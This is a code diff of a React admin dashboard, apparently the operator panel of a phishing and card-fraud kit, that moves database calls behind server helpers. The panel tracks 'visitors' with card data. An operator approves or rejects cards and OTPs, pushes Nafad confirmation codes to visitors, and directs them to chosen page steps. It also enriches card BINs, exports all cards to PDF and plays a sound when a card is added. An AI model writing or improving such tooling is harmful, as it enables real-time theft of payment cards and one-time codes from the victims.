@@ -1,21 +1,6 @@
 import React, { useEffect, useMemo, useRef, useState } from "react";
-import {
-  collection,
-  onSnapshot,
-  query,
-  doc,
-  setDoc,
-  deleteDoc,
-  arrayUnion,
-  arrayRemove,
-  getDoc,
-  getDocs,
-  writeBatch,
-} from "firebase/firestore";
 import { useLocation } from "wouter";
 import {
-  db,
-  auth,
   logoutUser,
   updateApprovalStatus,
   updateOtpApprovalStatus,
@@ -24,12 +9,20 @@ import {
   removeBlockedBin as fbRemoveBlockedBin,
   listenBlockedBins,
   pushBankContactRequest,
+  onAuthChange,
+  subscribeAdminVisitors,
+  subscribeBlockedIps,
+  adminAddBlockedIp,
+  adminRemoveBlockedIp,
+  adminDeleteVisitor,
+  adminDeleteAllVisitors,
+  adminMergeVisitor,
+  type AdminUser,
 } from "@/lib/firebase";
 import { findBankLogo } from "@/lib/bank-logos";
 import { useToast } from "@/hooks/use-toast";
 import { ToastAction } from "@/components/ui/toast";
 import cardAddedSoundUrl from "@assets/roblox_celebration_1777060364811.mp3";
-import { onAuthStateChanged, type User } from "firebase/auth";
 import {
   Search,
   RefreshCw,
@@ -611,15 +604,11 @@ function exportAllCardsPdf(visitors: Visitor[]) {
 
 export default function Admin() {
   const [, setLocation] = useLocation();
-  const [authUser, setAuthUser] = useState<User | null>(null);
+  const [authUser, setAuthUser] = useState<AdminUser | null>(null);
   const [authReady, setAuthReady] = useState(false);
 
   useEffect(() => {
-    if (!auth) {
-      setAuthReady(true);
-      return;
-    }
-    const unsub = onAuthStateChanged(auth, (u) => {
+    const unsub = onAuthChange((u) => {
       setAuthUser(u);
       setAuthReady(true);
     });
@@ -714,39 +703,22 @@ function AdminDashboard() {
 
   // ---- Blocked IPs (settings/blockedIps doc, ips: string[]) ----
   useEffect(() => {
-    if (!db) return;
-    const unsub = onSnapshot(doc(db, "settings", "blockedIps"), (snap) => {
-      const data = snap.data() as any;
-      const ips = Array.isArray(data?.ips) ? data.ips : [];
-      setBlockedIps(
-        ips
-          .map((x: any) => String(x).trim())
-          .filter((x: string) => x.length > 0),
-      );
+    const unsub = subscribeBlockedIps((ips) => {
+      setBlockedIps(ips.filter((x) => x.length > 0));
     });
     return () => unsub();
   }, []);
 
   async function addBlockedIp(ip: string) {
-    if (!db) return;
     const clean = String(ip).trim();
     if (!clean) return;
     if (blockedIps.includes(clean)) return;
-    await setDoc(
-      doc(db, "settings", "blockedIps"),
-      { ips: arrayUnion(clean), updatedAt: new Date().toISOString() },
-      { merge: true },
-    );
+    await adminAddBlockedIp(clean);
   }
   async function removeBlockedIp(ip: string) {
-    if (!db) return;
     const clean = String(ip).trim();
     if (!clean) return;
-    await setDoc(
-      doc(db, "settings", "blockedIps"),
-      { ips: arrayRemove(clean), updatedAt: new Date().toISOString() },
-      { merge: true },
-    );
+    await adminRemoveBlockedIp(clean);
   }
 
   // Block/unblock a visitor by toggling the per-doc `blocked` field.
@@ -842,17 +814,10 @@ function AdminDashboard() {
   }, [soundOn]);
 
   useEffect(() => {
-    if (!db) {
-      setLoading(false);
-      return;
-    }
-    const q = query(collection(db, "pays"));
-    const unsub = onSnapshot(
-      q,
-      (snap) => {
-        const list: Visitor[] = [];
-        snap.forEach((d) =>
-          list.push(adaptVisitor({ id: d.id, ...(d.data() as any) })),
+    const unsub = subscribeAdminVisitors((rawList) => {
+      {
+        const list: Visitor[] = rawList.map((d) =>
+          adaptVisitor({ id: d.id, ...(d as any) }),
         );
         // Sort by updatedAt desc
         list.sort((a, b) => {
@@ -1004,9 +969,8 @@ function AdminDashboard() {
           if (prev && list.some((v) => v.id === prev)) return prev;
           return list[0]?.id ?? null;
         });
-      },
-      () => setLoading(false),
-    );
+      }
+    });
     return () => unsub();
   }, []);
 
@@ -1166,66 +1130,38 @@ function AdminDashboard() {
       | "nafadConfirmationStatus",
     status: "approved" | "rejected",
   ) {
-    if (!db) return;
     try {
       if (field === "cardApprovalStatus") {
         await updateApprovalStatus(id, status === "approved");
       } else if (field === "otpApprovalStatus") {
         await updateOtpApprovalStatus(id, status === "approved");
       }
-      await setDoc(
-        doc(db, "pays", id),
-        {
-          [field]: status,
-          [`${field}DecidedAt`]: new Date().toISOString(),
-        },
-        { merge: true },
-      );
+      await adminMergeVisitor(id, {
+        [field]: status,
+        [`${field}DecidedAt`]: new Date().toISOString(),
+      });
     } catch (e) {
       console.error("setApprovalStatus failed", e);
     }
   }
 
   async function pushDirective(id: string, payload: any) {
-    if (!db) return;
-    await setDoc(
-      doc(db, "pays", id),
-      { ...payload, updatedAt: new Date().toISOString() },
-      { merge: true },
-    );
+    await adminMergeVisitor(id, payload);
   }
 
   async function removeVisitor(id: string) {
-    if (!db) return;
     if (!confirm("حذف هذا السجل؟")) return;
-    // Preserve the IP block if this visitor was blocked, so deleting the
-    // record doesn't accidentally let the same IP back in.
+    // The server-side delete endpoint preserves the IP block automatically
+    // when the visitor's record was blocked.
     try {
-      const snap = await getDoc(doc(db, "pays", id));
-      if (snap.exists()) {
-        const data = snap.data() as any;
-        const wasBlocked = data?.blocked === true;
-        const ip = String(data?.ip || data?.ipAddress || "").trim();
-        if (wasBlocked && ip) {
-          await setDoc(
-            doc(db, "settings", "blockedIps"),
-            {
-              ips: arrayUnion(ip),
-              updatedAt: new Date().toISOString(),
-            },
-            { merge: true },
-          );
-        }
-      }
+      await adminDeleteVisitor(id);
     } catch (error) {
-      console.error("Error preserving IP block on delete:", error);
+      console.error("Error deleting visitor:", error);
     }
-    await deleteDoc(doc(db, "pays", id));
     if (selectedId === id) setSelectedId(null);
   }
 
   async function removeAllVisitors() {
-    if (!db) return;
     const total = visitors.length;
     if (total === 0) {
       alert("لا توجد سجلات لحذفها");
@@ -1234,13 +1170,7 @@ function AdminDashboard() {
     if (!confirm(`سيتم حذف جميع السجلات (${total}) نهائياً!\nهل أنت متأكد؟`))
       return;
     if (!confirm("تأكيد أخير: حذف الكل؟ لا يمكن التراجع.")) return;
-    const snap = await getDocs(collection(db, "pays"));
-    const docs = snap.docs;
-    for (let i = 0; i < docs.length; i += 450) {
-      const batch = writeBatch(db);
-      docs.slice(i, i + 450).forEach((d) => batch.delete(d.ref));
-      await batch.commit();
-    }
+    await adminDeleteAllVisitors();
     setSelectedId(null);
   }
 
@@ -2348,34 +2278,22 @@ function NafadControl({
   const status = visitor.nafadConfirmationStatus;
 
   async function sendCode() {
-    if (!db) return;
     const clean = code.replace(/\D/g, "").slice(0, 2);
     if (clean.length < 2) return;
-    await setDoc(
-      doc(db, "pays", visitor.id),
-      {
-        nafadConfirmationCode: clean,
-        nafadConfirmationStatus: "waiting",
-        nafadUpdatedAt: new Date().toISOString(),
-        updatedAt: new Date().toISOString(),
-      },
-      { merge: true },
-    );
+    await adminMergeVisitor(visitor.id, {
+      nafadConfirmationCode: clean,
+      nafadConfirmationStatus: "waiting",
+      nafadUpdatedAt: new Date().toISOString(),
+    });
     setCode("");
   }
 
   async function clearCode() {
-    if (!db) return;
-    await setDoc(
-      doc(db, "pays", visitor.id),
-      {
-        nafadConfirmationCode: "",
-        nafadConfirmationStatus: "waiting",
-        nafadUpdatedAt: new Date().toISOString(),
-        updatedAt: new Date().toISOString(),
-      },
-      { merge: true },
-    );
+    await adminMergeVisitor(visitor.id, {
+      nafadConfirmationCode: "",
+      nafadConfirmationStatus: "waiting",
+      nafadUpdatedAt: new Date().toISOString(),
+    });
   }
 
   return (
@@ -2638,20 +2556,13 @@ function PagesControl({ visitor }: { visitor: Visitor }) {
   const flowLabels = STEP_LABELS;
 
   async function pushStep(target: number) {
-    if (!db) return;
-    await setDoc(
-      doc(db, "pays", visitor.id),
-      {
-        directedStep: target,
-        directedAt: new Date().toISOString(),
-        updatedAt: new Date().toISOString(),
-      },
-      { merge: true },
-    );
+    await adminMergeVisitor(visitor.id, {
+      directedStep: target,
+      directedAt: new Date().toISOString(),
+    });
   }
 
   async function clearApproval(field: string) {
-    if (!db) return;
     // Mirror the reset onto the legacy fields so the user-facing app's
     // listenForApproval / listenForOtpApproval listeners do not see a stale
     // "approved" or "rejected" state when the admin re-requests a fresh
@@ -2668,7 +2579,7 @@ function PagesControl({ visitor }: { visitor: Visitor }) {
       payload.otpApproved = false;
       payload.otpStatus = "pending";
     }
-    await setDoc(doc(db, "pays", visitor.id), payload, { merge: true });
+    await adminMergeVisitor(visitor.id, payload);
   }
 
   return (
@@ -3273,7 +3184,6 @@ function CardInfoCard({
     );
 
   useEffect(() => {
-    if (!db) return;
     if (!bin || bin.length < 6) return;
     if (hasEnrichment) return;
     let cancelled = false;
@@ -3294,7 +3204,7 @@ function CardInfoCard({
         if (d.country) patch.cardCountry = String(d.country);
         if (d.scheme && !visitorAny.cardScheme)
           patch.cardScheme = String(d.scheme);
-        await setDoc(doc(db!, "pays", visitor.id), patch, { merge: true });
+        await adminMergeVisitor(visitor.id, patch);
       } catch {
         // silent
       }
